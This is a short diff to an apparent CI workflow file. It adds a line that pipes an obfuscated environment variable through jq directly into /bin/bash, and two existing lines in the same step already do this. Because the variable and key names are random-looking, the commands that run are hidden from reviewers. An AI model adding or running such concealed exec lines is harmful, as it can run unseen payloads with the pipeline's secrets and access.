@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$w5" | jq -r .jrku15332 | /bin/bash
           echo $mbvw2296 | jq -r .cbx5754 | /bin/bash
+          echo $wemfq0 | jq -r .k08177 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
